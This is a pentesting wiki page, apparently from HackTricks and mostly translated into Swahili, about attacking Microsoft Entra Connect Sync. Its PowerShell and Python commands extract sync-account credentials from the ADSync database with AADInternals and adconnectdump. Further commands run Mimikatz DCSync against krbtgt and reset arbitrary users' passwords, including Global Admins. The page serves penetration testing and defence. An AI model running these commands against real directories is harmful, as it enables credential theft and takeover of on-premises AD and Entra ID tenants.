# Az - Connect Sync

{{#include ../../../../banners/hacktricks-training.md}}

## Basic Information

[From the docs:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/how-to-connect-sync-whatis) Microsoft Entra Connect synchronization services (Microsoft Entra Connect Sync) ni sehemu kuu ya Microsoft Entra Connect. Inashughulikia shughuli zote zinazohusiana na kusawazisha data za utambulisho kati ya mazingira yako ya ndani na Microsoft Entra ID.

Ili kuitumia, inahitajika kufunga **`Microsoft Entra Connect Sync`** wakala katika seva ndani ya mazingira yako ya AD. Wakala huyu atakuwa ndiye anayeshughulikia usawazishaji kutoka upande wa AD.

<figure><img src="../../../../images/image (173).png" alt=""><figcaption></figcaption></figure>

**Connect Sync** kimsingi ni njia ya "zamani" ya Azure ya **kusawazisha watumiaji kutoka AD hadi Entra ID.** Njia mpya inayopendekezwa ni kutumia **Entra Cloud Sync**:

{{#ref}}
az-cloud-sync.md
{{#endref}}

### Principals Generated

- Akaunti **`MSOL_<installationID>`** inaundwa kiotomatiki katika AD ya ndani. Akaunti hii inapata jukumu la **Directory Synchronization Accounts** (tazama [documentation](https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-assign-admin-roles#directory-synchronization-accounts-permissions)) ambayo inamaanisha kwamba ina **idhini za replication (DCSync) katika AD ya ndani**.
- Hii inamaanisha kwamba mtu yeyote anayepata akaunti hii ataweza kuathiri eneo la ndani.
- Akaunti ya huduma iliyosimamiwa **`ADSyncMSA<id>`** inaundwa katika AD ya ndani bila ruhusa maalum za msingi.
- Katika Entra ID, Service Principal **`ConnectSyncProvisioning_ConnectSync_<id>`** inaundwa kwa cheti.

## Synchronize Passwords

### Password Hash Synchronization

Sehemu hii inaweza pia kutumika **kusawazisha nywila kutoka AD hadi Entra ID** ili watumiaji waweze kutumia nywila zao za AD kuungana na Entra ID. Kwa hili, inahitajika kuruhusu usawazishaji wa nywila za hash katika wakala wa Microsoft Entra Connect Sync uliosakinishwa katika seva ya AD.

[From the docs:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/whatis-phs) **Password hash synchronization** ni moja ya mbinu za kuingia zinazotumika kufanikisha utambulisho wa mseto. **Azure AD Connect** inasawazisha hash, ya hash, ya nywila ya mtumiaji kutoka kwa mfano wa Active Directory wa ndani hadi mfano wa Azure AD wa wingu.

Kimsingi, **watumiaji** wote na **hash ya nywila za hash** wanasawazishwa kutoka kwa AD ya ndani hadi Azure AD. Hata hivyo, **nywila za maandiko wazi** au **hashes** **za asili** hazitumwi kwa Azure AD.

**Usawazishaji wa hashes** unafanyika kila **dakika 2**. Hata hivyo, kwa kawaida, **kuisha kwa nywila** na **kuisha kwa akaunti** **hakusawazishwi** katika Azure AD. Hivyo, mtumiaji ambaye **nywila yake ya ndani imeisha** (haijabadilishwa) anaweza kuendelea **kupata rasilimali za Azure** akitumia nywila ya zamani.

Wakati mtumiaji wa ndani anapotaka kupata rasilimali ya Azure, **uthibitishaji unafanyika kwenye Azure AD**.

> [!NOTE]
> Kwa kawaida watumiaji wa vikundi vya kibali vilivyojulikana kama Domain Admins wenye sifa **`adminCount` kuwa 1 hawanasawazishwi** na Entra ID kwa sababu za usalama. Hata hivyo, watumiaji wengine ambao ni sehemu ya vikundi vya kibali bila sifa hii au ambao wamepewa ruhusa za juu moja kwa moja **wanaweza kusawazishwa**.

### Password Writeback

Mipangilio hii inaruhusu **kusawazisha nywila kutoka Entra ID hadi AD** wakati mtumiaji anabadilisha nywila yake katika Entra ID. Kumbuka kwamba ili kuandika nywila ifanye kazi, mtumiaji `MSOL_<id>` aliyeundwa kiotomatiki katika AD anahitaji kupewa [ruhusa zaidi kama ilivyoelezwa katika nyaraka](https://learn.microsoft.com/en-us/entra/identity/authentication/tutorial-enable-sspr-writeback) ili aweze **kubadilisha nywila za mtumiaji yeyote katika AD**.

Hii ni ya kuvutia sana kuathiri AD kutoka kwa Entra ID iliyovunjwa kwani utaweza kubadilisha nywila ya "karibu" mtumiaji yeyote.

Wasimamizi wa eneo na watumiaji wengine wanaohusiana na vikundi fulani vya kibali hawana nakala ikiwa kikundi kina sifa ya **`adminCount` kuwa 1**. Lakini watumiaji wengine ambao wamepewa ruhusa za juu ndani ya AD bila kuhusika na vikundi hivyo wanaweza kubadilisha nywila zao. Kwa mfano:

- Watumiaji walipewa ruhusa za juu moja kwa moja.
- Watumiaji kutoka kikundi cha **`DNSAdmins`**.
- Watumiaji kutoka kikundi **`Group Policy Creator Owners`** ambao wameunda GPOs na kuzipeleka kwa OUs wataweza kubadilisha GPOs walizounda.
- Watumiaji kutoka **`Cert Publishers Group`** ambao wanaweza kuchapisha vyeti kwa Active Directory.
- Watumiaji wa kikundi kingine chochote chenye ruhusa za juu bila sifa ya **`adminCount` kuwa 1**.

## Pivoting AD --> Entra ID

### Enumerating Connect Sync

Check for users:
```bash
# Check for the users created by the Connect Sync
Install-WindowsFeature RSAT-AD-PowerShell
Import-Module ActiveDirectory
Get-ADUser -Filter "samAccountName -like 'MSOL_*'" -Properties * | select SamAccountName,Description | fl
Get-ADServiceAccount -Filter "SamAccountName -like 'ADSyncMSA*'" -Properties SamAccountName,Description | Select-Object SamAccountName,Description | fl
Get-ADUser -Filter "samAccountName -like 'Sync_*'" -Properties * | select SamAccountName,Description | fl

# Check it using raw LDAP queries without needing an external module
$searcher = New-Object System.DirectoryServices.DirectorySearcher
$searcher.Filter = "(samAccountName=MSOL_*)"
$searcher.FindAll()
$searcher.Filter = "(samAccountName=ADSyncMSA*)"
$searcher.FindAll()
$searcher.Filter = "(samAccountName=Sync_*)"
$searcher.FindAll()
```
Angalia kwa **Connect Sync configuration** (ikiwa ipo):
```bash
az rest --url "https://graph.microsoft.com/v1.0/directory/onPremisesSynchronization"
# Check if password sychronization is enabled, if password and group writeback are enabled...
```
### Kupata nywila

Nywila za mtumiaji wa **`MSOL_*`** (na mtumiaji wa **Sync\_\*** ikiwa umeundwa) zime **hifadhiwa katika seva ya SQL** kwenye seva ambapo **Entra ID Connect imewekwa.** Wasimamizi wanaweza kutoa nywila za watumiaji hao wenye mamlaka kwa maandiko wazi.\
Hifadhidata iko katika `C:\Program Files\Microsoft Azure AD Sync\Data\ADSync.mdf`.

Inawezekana kutoa usanidi kutoka moja ya meza, ikiwa moja imefungwa:

`SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent;`

Usanidi **ulioungwa** umefungwa kwa **DPAPI** na unajumuisha **nywila za mtumiaji wa `MSOL_*`** katika AD ya ndani na nywila ya **Sync\_\*** katika AzureAD. Hivyo, kuathiri hizi kunawezesha kupandisha hadhi hadi AD na AzureAD.

Unaweza kupata [muonekano kamili wa jinsi akreditivu hizi zinavyohifadhiwa na kufichuliwa katika mazungumzo haya](https://www.youtube.com/watch?v=JEIR5oGCwdg).

### Kutumia MSOL\_*
```bash
# Once the Azure AD connect server is compromised you can extract credentials with the AADInternals module
Install-Module -Name AADInternals -RequiredVersion 0.9.0 # Uninstall-Module AADInternals  if you have a later version
Import-Module AADInternals
Get-AADIntSyncCredentials
# Or check DumpAADSyncCreds.exe from https://github.com/Hagrid29/DumpAADSyncCreds/tree/main

# Using https://github.com/dirkjanm/adconnectdump
python .\adconnectdump.py [domain.local]/administrator:<password>@192.168.10.80
.\ADSyncQuery.exe C:\Users\eitot\Tools\adconnectdump\ADSync.mdf > out.txt
python .\adconnectdump.py [domain.local]/administrator:<password>@192.168.10.80 --existing-db --from-file out.txt

# Using the creds of MSOL_* account, you can run DCSync against the on-prem AD
runas /netonly /user:defeng.corp\MSOL_123123123123 cmd
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt /domain:domain.local /dc:dc.domain.local"'
```
> [!WARNING]
> Mashambulizi ya awali yalihatarisha nenosiri jingine ili kuungana na mtumiaji wa Entra ID anayeitwa `Sync_*` na kisha kuhatarisha Entra ID. Hata hivyo, mtumiaji huyu hayupo tena.


### Kutumia ConnectSyncProvisioning_ConnectSync\_<id>

Programu hii imeundwa bila kuwa na majukumu yoyote ya usimamizi wa Entra ID au Azure yaliyotolewa. Hata hivyo, ina ruhusa zifuatazo za API:

- Microsoft Entra AD Synchronization Service
- `ADSynchronization.ReadWrite.All`
- Microsoft password reset service
- `PasswordWriteback.OffboardClient.All`
- `PasswordWriteback.RefreshClient.All`
- `PasswordWriteback.RegisterClientVersion.All`

Imependekezwa kwamba SP wa programu hii bado inaweza kutumika kufanya baadhi ya vitendo vya kijasiri kwa kutumia API isiyoandikwa, lakini hakuna PoC iliyopatikana hadi sasa.\
Katika hali yoyote, kufikiria kwamba hii inaweza kuwa inawezekana itakuwa ya kuvutia kuchunguza zaidi jinsi ya kupata cheti cha kuingia kama huduma hii ya kiongozi na kujaribu kukitumia.

Hii [blog post](https://posts.specterops.io/update-dumping-entra-connect-sync-credentials-4a9114734f71) ilitolewa hivi karibuni kabla ya mabadiliko kutoka kutumia mtumiaji `Sync_*` hadi huduma hii ya kiongozi, ilielezea kwamba cheti kilihifadhiwa ndani ya seva na ilikuwa inawezekana kukipata, kuunda PoP (Proof of Possession) yake na token ya grafu, na kwa hili, kuwa na uwezo wa kuongeza cheti kipya kwa huduma ya kiongozi (kwa sababu **service principal** inaweza kila wakati kujitengenezea cheti kipya) na kisha kukitumia kudumisha uthabiti kama SP.

Ili kutekeleza vitendo hivi, zana zifuatazo zimechapishwa: [SharpECUtils](https://github.com/hotnops/ECUtilities/tree/main/SharpECUtils).

Katika uzoefu wangu, cheti hakihifadhiwi tena mahali ambapo zana ya awali ilikuwa ikitafuta, na kwa hivyo, zana hiyo haifanyi kazi tena. Hivyo, utafiti zaidi unaweza kuhitajika.

### Kutumia Sync\_\* [DEPRECATED]

> [!WARNING]
> Awali mtumiaji anayeitwa `Sync_*` aliumbwa katika Entra ID na ruhusa nyeti sana zilizotolewa, ambazo ziliruhusu kufanya vitendo vya kijasiri kama kubadilisha nenosiri la mtumiaji yeyote au kuongeza akidi mpya kwa huduma ya kiongozi. Hata hivyo, kuanzia Jan2025 mtumiaji huyu hauumbwi tena kwa kawaida kwani sasa programu/SP **`ConnectSyncProvisioning_ConnectSync_<id>`** inatumika. Hata hivyo, inaweza bado kuwepo katika mazingira mengine, hivyo inafaa kuangalia kwa ajili yake.

Kuhatarisha akaunti ya **`Sync_*`** inawezekana **kurekebisha nenosiri** la mtumiaji yeyote (ikiwemo Wasimamizi wa Kimataifa)
```bash
Install-Module -Name AADInternals -RequiredVersion 0.9.0 # Uninstall-Module AADInternals  if you have a later version
Import-Module AADInternals

# This command, run previously, will give us alse the creds of this account
Get-AADIntSyncCredentials

# Get access token for Sync_* account
$passwd = ConvertTo-SecureString '<password>' -AsPlainText - Force
$creds = New-Object System.Management.Automation.PSCredential ("Sync_SKIURT-JAUYEH_123123123123@domain.onmicrosoft.com", $passwd)
Get-AADIntAccessTokenForAADGraph -Credentials $creds - SaveToCache

# Get global admins
Get-AADIntGlobalAdmins

# Get the ImmutableId of an on-prem user in Azure AD (this is the Unique Identifier derived from on-prem GUID)
Get-AADIntUser -UserPrincipalName onpremadmin@domain.onmicrosoft.com | select ImmutableId

# Reset the users password
Set-AADIntUserPassword -SourceAnchor "3Uyg19ej4AHDe0+3Lkc37Y9=" -Password "JustAPass12343.%" -Verbose

# Now it's possible to access Azure AD with the new password and op-prem with the old one (password changes aren't sync)
```
Inawezekana pia **kubadilisha nywila za watumiaji wa wingu tu** (hata kama hiyo siyo ya kutarajia)
```bash
# To reset the password of cloud only user, we need their CloudAnchor that can be calculated from their cloud objectID
# The CloudAnchor is of the format USER_ObjectID.
Get-AADIntUsers | ?{$_.DirSyncEnabled -ne "True"} | select UserPrincipalName,ObjectID

# Reset password
Set-AADIntUserPassword -CloudAnchor "User_19385ed9-sb37-c398-b362-12c387b36e37" -Password "JustAPass12343.%" -Verbosewers
```
Ni pia inawezekana kutoa nenosiri la mtumiaji huyu.

> [!CAUTION]
> Chaguo lingine lingekuwa **kutoa ruhusa za kipaumbele kwa huduma ya msingi**, ambayo mtumiaji wa **Sync** ana **ruhusa** ya kufanya, na kisha **kupata huduma hiyo ya msingi** kama njia ya privesc.

### Seamless SSO

Inawezekana kutumia Seamless SSO na PHS, ambayo inahatarishwa na matumizi mengine. Angalia katika:

{{#ref}}
seamless-sso.md
{{#endref}}

## Pivoting Entra ID --> AD

- Ikiwa kuandika nenosiri kumewezeshwa, unaweza **kubadilisha nenosiri la mtumiaji yeyote katika AD** ambayo inasawazishwa na Entra ID.
- Ikiwa kuandika vikundi kumewezeshwa, unaweza **kuongeza watumiaji kwenye vikundi vya kipaumbele** katika Entra ID ambavyo vinasawazishwa na AD.

## Marejeleo

- [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-phs](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-phs)
- [https://aadinternals.com/post/on-prem_admin/](https://aadinternals.com/post/on-prem_admin/)
- [https://troopers.de/downloads/troopers19/TROOPERS19_AD_Im_in_your_cloud.pdf](https://troopers.de/downloads/troopers19/TROOPERS19_AD_Im_in_your_cloud.pdf)
- [https://www.youtube.com/watch?v=xei8lAPitX8](https://www.youtube.com/watch?v=xei8lAPitX8)
- [https://www.silverfort.com/blog/exploiting-weaknesses-in-entra-id-account-synchronization-to-compromise-the-on-prem-environment/](https://www.silverfort.com/blog/exploiting-weaknesses-in-entra-id-account-synchronization-to-compromise-the-on-prem-environment/)
- [https://posts.specterops.io/update-dumping-entra-connect-sync-credentials-4a9114734f71](https://posts.specterops.io/update-dumping-entra-connect-sync-credentials-4a9114734f71)

{{#include ../../../../banners/hacktricks-training.md}}
